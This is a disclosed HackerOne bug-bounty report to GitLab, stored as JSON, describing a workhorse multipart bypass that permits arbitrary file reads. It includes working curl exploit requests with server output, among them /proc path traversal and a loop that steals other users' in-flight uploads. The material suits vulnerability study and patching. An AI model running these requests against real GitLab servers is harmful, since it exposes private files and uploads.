{
  "id": 850447,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NTA0NDc=",
  "url": "https://hackerone.com/reports/850447",
  "title": "gitlab-workhorse bypass in Gitlab::Middleware::Multipart allowing files in `allowed_paths` to be read",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-04-15T14:59:54.154Z",
  "submitted_at": "2020-04-15T14:59:54.154Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5H6JMDKF%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T102524Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIr%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDFUPw5yUY8Vc32vxhAXP8PHFtr7JcEDzZv1bMYgxLmWwIgFqsO%2Fxtfx2BzXh0nWzMCT3JOH2Kp51%2F67DH8BPVph94qsQUIEhADGgwwMTM2MTkyNzQ4NDkiDFz7U%2FwFlXJI4uaVBCqOBWLhVYLwDGyfB9OTItyJREfKQC7jCNbrFxOFYNiaxRZlEQDIr81dbOpBWVw6nD91InCsQcyNRGrZglgF2HWSTCTkD4JMTnLcO8rV9hp1JqUK2fuSZDPAAioD12VT%2FYFu4rR8tx%2FqZV78%2Fz78kRgmRe7anLfklxebhPsPDQlylgR02pfw7cLbx7EH%2Fa%2BnBu%2Bi4isdYaNBhTewYG4wgD%2Fyv629guMa37ky2ByxpaQu3Y9aAsprFuUq%2Bxw77q%2BOE1j2MxwLVTMExO3kA0BmUgAsHCSm6LjYR7ZKYjmYxOkInLKDmQApdOZgmuD6U7LlMHH1tUHnBGOCXsbjpiIuk%2FKTyE9ejqbQ9XOv7g5RQd7rJpytmSh6Pm%2Bqi6TBE2xMUxn%2FIrr6o%2F8WL17StVT9lbGuMDIbg5PyEMSYb9DSmjJDCwdAa9xRDogyWBpSTXvBcAgT%2Fa%2FOKHdK04JYRjNuYPW8LnHHdpMMVWgtH9GtBMOMR%2Fg%2F2x1PAO0Ct5agZ0ft4b4SuIoURDtq0F8rl%2BAJU3uEfHf57o7zvcwuRqLNYxZ9QTp2wf7c60TxjIgOOkelF2IBHBb5MtL4IlHaAlJLnnvLF5x9T9mTMgsXFs%2BZgWRoUkS0kce3bhA1FqkA%2FgoiuDDQtn3UBN32wkP9NFkL57sNTWvRo4wpvz44Cf0T8kb2TBb8Bo6AcFIEYRLQkaEieN3a82hZkx9UI5Mg3u8SmNohBg%2B5m%2F3grhhUJqpDZzzXyff9pBij0PrN7CQ4iLofrmPvBADnV0P0JW%2B1wfrsDjxo%2FEFUTcD%2FAnX4iykp7U2E1Qq2OfABaru9GS0%2BqLyjKkMyE95VhEWUKRfRfYt0etc%2BmOcQtMLhR6sN9T5a6dlSdzCbh7%2FGBjqxARSGw%2B1SDekTRlDJWVt3%2Ff8YFxAG%2BJYbPq56MgZRHHuwNBYJkWYPap5oPvd%2FYtDWuQGcglXwI4iBaukn9Mm7Vuvrpy7WLmraNkXjpR8AGfuegKZfhetKKtZ0ZZ2LIVyWsOX1F2XLEf8CngPGhYdem%2BTVl03E%2FmOsfimhgxjkRsbJA0dJ4KnIDStb84TiXyuS1nlI%2BVR9uPoNNry%2F2pVdy4OuFdyeJ6VbNFlEeTCEV7O4Fw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4ea745a6a986a1c85d8ecba5c60ffc5ec850b046bd5e7b46233bf13d7e0e9011"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-06-08T04:57:08.889Z",
  "bug_reporter_agreed_on_going_public_at": "2020-06-07T01:28:28.614Z",
  "team_member_agreed_on_going_public_at": "2020-06-08T04:57:08.801Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\nExtracted from https://hackerone.com/reports/835455#activity-7672566\n\nWhile testing and looking at the patch for the nuget package workhorse bypass (https://gitlab.com/gitlab-org/gitlab/issues/209080 I think) I came across a more widespread bypass:\n\n```bash\n# create test file on gitlab server\necho hello > /tmp/ggg; sudo chown git:git /tmp/ggg\n\n# attacker\ncurl -XPUT -v -F '[package]=@/tmp/lala.txt' \"http://vakzz:$TOKEN@gitlab-vm.local/api/v4/projects/171/packages/nuget/?package.path=/tmp/ggg\"\n\n{\"message\":\"201 Created\"}\n```\n\nUsing `[package]` as the field name causes the `@rewritten_fields` to contain:\n\n```json\n{\n  \"rewritten_fields\": {\n    \"[package]\": \"/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/lala.txt539589799\"\n  },\n  \"iss\": \"gitlab-workhorse\"\n}\n```\nThis is then used `parsed_field = Rack::Utils.parse_nested_query(field)` which ends up creating the hash `{\"package\"=>nil}` (same as package would return). This passes the validation, but the `Multipart::Handler` will then use the query params as they match instead of the payload that workhorse sends through.\n\nThis also allows for any file in the following to be accessed:\n\n```ruby\n       def allowed_paths\n          [\n            ::FileUploader.root,\n            Gitlab.config.uploads.storage_path,\n            JobArtifactUploader.workhorse_upload_path,\n            File.join(Rails.root, 'public/uploads/tmp')\n          ]\n        end\n```\n\nThis could be done anywhere that accelerated uploads, eg the `UploadsController` or uploading a wiki file.\n\nUsing the wiki api removes the restriction that the file needs to be owned by `git` due to `file_content: attrs[:file].read` happening instead of moving the original file:\n\n```bash\necho hello > /tmp/ggg; sudo chown root:root /tmp/ggg\n\n$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'\n\n{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\n```\n\nIt's also fairly easy to steal incoming files tmp files that are currently opened in rails by:\n\n1. Determine a valid PID by looping over `/proc/PID` until a `cwd` is found and readable by `git` (eg the `unicorn` worker will have `/proc/19606/cwd -> /var/opt/gitlab/gitlab-rails/working`) and traverse to a valid upload path:\n\n    ```bash\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19601/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n500\n$ curl -s -o /dev/null -w \"%{http_code}\\n\" -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/cwd/../../../../../opt/gitlab/embedded/service/gitlab-rails/public/422.html' -F '[file]=@/tmp/lala.txt'\n201\n    ```\n\n1. Using this pid, use `/proc/PID/fd/XX` as the `file.path` (looking at my server a fd of 44 was the used pretty consistently for tmp files) and run it in a loop:\n\n    ```bash\n$ while true; do curl -s -XPOST -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/proc/19603/fd/44' -F '[file]=@/tmp/lala.txt'| grep file_name; done\n    ```\n\n1. Upload a bunch of things, eventually a file will be stolen:\n\n    ```json\n{\"file_name\":\"image.png115893730\",\"file_path\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730\",\"markdown\":\"[image.png115893730](uploads/232bcab08d5dcc29cc45c9fa1e868484/image.png115893730)\"}}\n    ```\n\n### Steps to reproduce\n\n1. create a new project\n1. create a wiki page\n1. create a test file on the gitlab server: `echo hello > /tmp/ggg;`\n1. create a dummy file on the attackers server `echo unused > /tmp/lala.txt`\n1. Upload a wiki file using the crafted params\n        ```bash\n$ curl -g -XPOST -v -H \"Authorization: Bearer $TOKEN\" 'http://gitlab-vm.local/api/v4/projects/171/wikis/attachments?file.path=/tmp/ggg' -F '[file]=@/tmp/lala.txt'`\n{\"file_name\":\"ggg\",\"file_path\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"branch\":\"master\",\"link\":{\"url\":\"uploads/58ec1627b3f14eba0a16659fd859da63/ggg\",\"markdown\":\"[ggg](uploads/58ec1627b3f14eba0a16659fd859da63/ggg)\"}}\n        ```\n1. paste the markdown into the wiki page and download the file\n\n### Impact\n* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`\n* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.\n\n### Examples\n* https://gitlab.com/vakzz-h1/workhorse-bypass/-/wikis/home\nThe above was uploaded using `file.path=/opt/gitlab/embedded/service/gitlab-rails/public/422.html` to verify.\n\n### What is the current *bug* behavior?\nAn attacker can specify `file.*` params and have gitlab believe they are valid and signed \n\n### What is the expected *correct* behavior?\nOnly params from the workhorse should be valid\n\n### Output of checks\n#### Results of GitLab environment info\n```\nSystem information\nSystem:     Ubuntu 18.04\nProxy:      no\nCurrent User:   git\nUsing RVM:  no\nRuby Version:   2.6.5p114\nGem Version:    2.7.10\nBundler Version:1.17.3\nRake Version:   12.3.3\nRedis Version:  5.0.7\nGit Version:    2.24.1\nSidekiq Version:5.2.7\nGo Version: unknown\n\nGitLab information\nVersion:    12.9.3-ee\nRevision:   7c13691fb8e\nDirectory:  /opt/gitlab/embedded/service/gitlab-rails\nDB Adapter: PostgreSQL\nDB Version: 10.12\nURL:        http://gitlab-vm.local\nHTTP Clone URL: http://gitlab-vm.local/some-group/some-project.git\nSSH Clone URL:  git@gitlab-vm.local:some-group/some-project.git\nElasticsearch:  no\nGeo:        no\nUsing LDAP: no\nUsing Omniauth: yes\nOmniauth Providers:\n\nGitLab Shell\nVersion:    12.0.0\nRepository storage paths:\n- default:  /var/opt/gitlab/git-data/repositories\nGitLab Shell path:      /opt/gitlab/embedded/service/gitlab-shell\nGit:        /opt/gitlab/embedded/bin/git\n```\n\n## Impact\n\n* read known files in `::FileUploader.root, Gitlab.config.uploads.storage_path, JobArtifactUploader.workhorse_upload_path, File.join(Rails.root, 'public/uploads/tmp')`\n* read unknown inflight files by using the symlinks in `/proc/PID/fd/XX` belonging to other users.",
  "bounty_amount": "10000.0",
  "formatted_bounty": "$10,000",
  "weakness": {
    "id": 18,
    "name": "Information Disclosure"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 406,
  "voters": [
    "r4d1kal",
    "trojan187",
    "sebd",
    "oussamaka",
    "jazz______",
    "wapiflapi",
    "orange303",
    "proviesec",
    "sky003",
    "n1m0",
    "and 396 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
